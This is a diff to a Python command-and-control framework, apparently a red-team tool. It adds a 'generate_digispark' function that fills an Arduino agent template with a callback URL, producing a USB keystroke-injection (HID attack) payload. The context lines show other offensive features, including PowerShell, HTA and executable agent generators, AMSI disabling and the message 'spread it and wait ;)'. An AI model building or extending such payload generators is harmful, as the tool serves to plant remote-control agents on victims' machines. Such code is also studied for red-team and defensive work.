@@ -22,7 +22,7 @@ commands = {}
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
 aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_duckyscript"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark"]
 
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules"]
 
@@ -142,11 +142,21 @@ def generate_hta(host_ip, port,proto):
     print("spread it and wait ;)")
     print((colored("#====================", "red")))
 
-def generate_duckyscript(hostname, path, proto, output_path):
+def generate_digispark(hostname, path, proto, output_path):
+    url = "{2}://{0}/{1}".format(hostname, path, proto)
     # Open the ducky template
+    ino_template = open("agents/agent.ino")
+    template = ino_template.read()
     # Replace the URL
-    # Export to file
-    pass
+    code = template.replace("OCT_URL", url)
+    try:
+        f = open(output_path, "w")
+        f.write(code)
+        f.close()
+        print((colored("[+] file generated successfully!", "green")))
+    except:
+        print("[-] error while generating the file!")
+
 
 def generate_exe(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
@@ -179,6 +189,7 @@ def main_help_banner():
     print("* generate_powershell \t\tgenerate powershell oneliner")
     print("* generate_hta \t\t\tgenerate HTA Link")
     print("* generate_exe \t\t\tgenerate executable agent")
+    print("* generate_digispark \t\tgenerate digispark file (HID Attack)")
     print("* listen_http  \t\t\tto start a HTTP listener")
     print("* listen_https  \t\tto start a HTTPS listener")
     print("interact {session}  \t\tto interact with a session")
